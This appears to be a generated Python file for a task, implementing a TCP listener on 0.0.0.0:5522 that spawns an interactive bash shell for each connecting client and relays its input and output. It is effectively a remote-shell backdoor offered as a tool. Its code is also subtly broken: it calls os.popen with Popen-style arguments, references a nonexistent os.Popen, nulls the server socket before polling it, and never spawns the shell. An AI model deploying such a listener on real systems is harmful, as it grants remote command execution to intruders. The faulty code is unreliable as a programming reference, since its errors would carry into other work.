"""Unix reverse shell listener that spawns subprocesses and multiplexes I/O via sockets."""
from TASK_001_models import ExecutionResult, ReverseShellConfig
import socket
import select
import os
import sys
from typing import Optional, List, Tuple


class UnixReverseShell:
    """Manages a single reverse shell session with subprocess spawning and I/O multiplexing.

    Uses select.select() for non-blocking I/O between the client socket and child process
    file descriptors to handle command input and output forwarding simultaneously.
    """

    def __init__(self, config: ReverseShellConfig) -> None:
        self.config = config
        self.client_socket: Optional[socket.socket] = None
        self.child_process: Optional[os.Popen] = None
        self.stdin_pipe: Optional[socket.socket] = None
        self.stdout_pipe: Optional[socket.socket] = None
        self.stderr_pipe: Optional[socket.socket] = None
        self.running = False

    def spawn(self) -> ExecutionResult:
        """Spawn a subprocess with shell=True and set up socket piping.

        Returns:
            ExecutionResult describing the outcome of spawning the process.
        """
        try:
            # Create pipes for stdin, stdout, stderr
            self.stdin_pipe = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            self.stdout_pipe = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            self.stderr_pipe = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)

            # Spawn the shell subprocess with file descriptor redirection
            self.child_process = os.popen(
                f"{self.config.shell_type} -i",
                stdin=self.stdin_pipe.fileno(),
                stdout=self.stdout_pipe.fileno(),
                stderr=self.stderr_pipe.fileno(),
                close_fds=True,
            )

            # Set up non-blocking mode on pipes
            self.stdin_pipe.setblocking(False)
            self.stdout_pipe.setblocking(False)
            self.stderr_pipe.setblocking(False)

            return ExecutionResult(
                command_output="",
                exit_code=0,
                error_messages=[],
            )

        except Exception as e:
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=[str(e)],
            )

    def run(self) -> ExecutionResult:
        """Main multiplexing loop using select.select().

        Polls the client socket and all process pipes for I/O events.
        Reads commands from client stdin, writes to child stdin;
        reads from child stdout/stderr, writes back to client stdout.

        Returns:
            ExecutionResult with accumulated output.
        """
        self.running = True

        # Collect file descriptors for select
        read_fds: List[socket.socket] = []
        write_fds: List[socket.socket] = []

        if self.client_socket and not self.client_socket.getpeername():
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=["Client socket not connected"],
            )

        read_fds.append(self.client_socket)

        if self.stdin_pipe:
            read_fds.append(self.stdin_pipe)
        if self.stdout_pipe:
            write_fds.append(self.stdout_pipe)
        if self.stderr_pipe:
            write_fds.append(self.stderr_pipe)

        # Add child process stdin to write list (send commands to it)
        if self.child_process and self.child_process.stdin:
            read_fds.append(self.child_process.stdin)

        while self.running:
            try:
                # Use select.select for non-blocking multiplexing
                readable, writable, exceptional = select.select(
                    read_fds, write_fds, [], 1.0
                )

                if not (readable or writable or exceptional):
                    continue

                for fd in readable:
                    try:
                        data = fd.recv(4096)
                        if data:
                            self._handle_input(fd, data)
                        else:
                            # EOF on this pipe - process may have exited
                            pass
                    except BlockingIOError:
                        continue
                    except ConnectionResetError:
                        break

                for fd in writable:
                    try:
                        if not fd.send(b""):
                            fd.close()
                    except BlockingIOError:
                        continue
                    except OSError:
                        break

            except select.error as e:
                return ExecutionResult(
                    command_output="",
                    exit_code=-1,
                    error_messages=[f"Select error: {e}"],
                )

        # Cleanup
        self._cleanup()

        return ExecutionResult(
            command_output=self._collect_output(),
            exit_code=0 if self.child_process and self.child_process.poll() is not None else -1,
            error_messages=[],
        )

    def _handle_input(self, fd: socket.socket, data: bytes) -> None:
        """Route input from client to child process stdin."""
        try:
            # Forward command from client to subprocess
            if self.child_process and self.child_process.stdin:
                self.child_process.stdin.write(data.decode("utf-8", errors="replace"))
                self.child_process.stdin.flush()

            # Also forward to stdout for logging
            if self.stdout_pipe:
                self.stdout_pipe.sendall(data)
        except Exception as e:
            pass  # Silently handle write failures in multiplexing loop

    def _collect_output(self) -> str:
        """Collect all output from the child process."""
        output = []
        if self.stdout_pipe:
            try:
                while True:
                    data = self.stdout_pipe.recv(4096)
                    if not data:
                        break
                    output.append(data.decode("utf-8", errors="replace"))
            except BlockingIOError:
                pass
            except ConnectionResetError:
                pass

        if self.stderr_pipe:
            try:
                while True:
                    data = self.stderr_pipe.recv(4096)
                    if not data:
                        break
                    output.append(data.decode("utf-8", errors="replace"))
            except BlockingIOError:
                pass
            except ConnectionResetError:
                pass

        return "".join(output)

    def _cleanup(self) -> None:
        """Clean up all file descriptors and process."""
        self.running = False
        if self.child_process:
            try:
                self.child_process.terminate()
                self.child_process.wait(timeout=5)
            except Exception:
                pass
        if self.client_socket:
            try:
                self.client_socket.close()
            except Exception:
                pass
        for pipe in [self.stdin_pipe, self.stdout_pipe, self.stderr_pipe]:
            if pipe:
                try:
                    pipe.close()
                except Exception:
                    pass


class UnixReverseShellListener:
    """TCP listener that accepts connections and spawns reverse shell sessions.

    Binds to 0.0.0.0:5522 by default, accepting incoming TCP connections
    and spawning a new UnixReverseShell instance for each client.
    """

    def __init__(self, config: ReverseShellConfig) -> None:
        self.config = config
        self.server_socket: Optional[socket.socket] = None
        self.running = False
        self.sessions: List[UnixReverseShell] = []

    def start(self) -> ExecutionResult:
        """Start the listener server.

        Returns:
            ExecutionResult indicating whether the server started successfully.
        """
        try:
            # Create TCP socket and bind to configured address/port
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.config.host, self.config.port))
            self.server_socket.listen(5)
            self.server_socket.setblocking(False)

            return ExecutionResult(
                command_output=f"Listening on {self.config.host}:{self.config.port}",
                exit_code=0,
                error_messages=[],
            )

        except Exception as e:
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=[f"Failed to bind: {e}"],
            )

    def run(self) -> ExecutionResult:
        """Main listener loop accepting connections and spawning sessions.

        Uses select.select() to non-blockingly poll the server socket for
        incoming connection requests. Each accepted connection spawns a
        new UnixReverseShell instance.

        Returns:
            ExecutionResult with accumulated output from all sessions.
        """
        self.running = True
        self.server_socket = None  # Reset after start() succeeds

        while self.running:
            try:
                readable, writable, exceptional = select.select(
                    [self.server_socket], [], [], 1.0
                )

                if not (readable or writable or exceptional):
                    continue

                for sock in readable:
                    try:
                        client_socket, addr = self.server_socket.accept()
                        # Spawn a new reverse shell session for this connection
                        session = UnixReverseShell(self.config)
                        session.client_socket = client_socket
                        self.sessions.append(session)
                        result = session.run()
                        if result.exit_code == 0:
                            output = result.command_output.strip() or "Session ended"
                        else:
                            output = "\n".join(result.error_messages)
                        print(f"[{self.config.host}:{self.config.port}] {output}", flush=True)

                    except OSError as e:
                        pass

            except select.error as e:
                return ExecutionResult(
                    command_output="",
                    exit_code=-1,
                    error_messages=[f"Select error: {e}"],
                )

        # Cleanup all sessions
        for session in self.sessions:
            session._cleanup()
        self.sessions.clear()

        return ExecutionResult(
            command_output="Server stopped",
            exit_code=0,
            error_messages=[],
        )

    def stop(self) -> None:
        """Stop the listener and clean up all sessions."""
        self.running = False
        for session in self.sessions:
            session._cleanup()
        self.sessions.clear()


def main(config: Optional[ReverseShellConfig] = None) -> ExecutionResult:
    """Entry point for the reverse shell listener.

    Args:
        config: ReverseShellConfig instance (uses defaults if not provided).

    Returns:
        ExecutionResult with final status of the server run.
    """
    if config is None:
        config = ReverseShellConfig()

    listener = UnixReverseShellListener(config)
    start_result = listener.start()

    if start_result.exit_code == 0:
        return listener.run()
    else:
        return ExecutionResult(
            command_output="",
            exit_code=start_result.exit_code,
            error_messages=start_result.error_messages,
        )


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Unix Reverse Shell Listener")
    parser.add_argument("--host", type=str, default="0.0.0.0", help="Bind address")
    parser.add_argument("--port", type=int, default=5522, help="Port to listen on")
    parser.add_argument(
        "--timeout", type=float, default=30.0, help="Connection timeout in seconds"
    )
    parser.add_argument(
        "--shell-type", type=str, default="bash", help="Shell to spawn (e.g., bash)"
    )

    args = parser.parse_args()

    config = ReverseShellConfig(
        host=args.host,
        port=args.port,
        timeout=args.timeout,
        shell_type=args.shell_type,
    )

    result = main(config)
    sys.exit(result.exit_code)
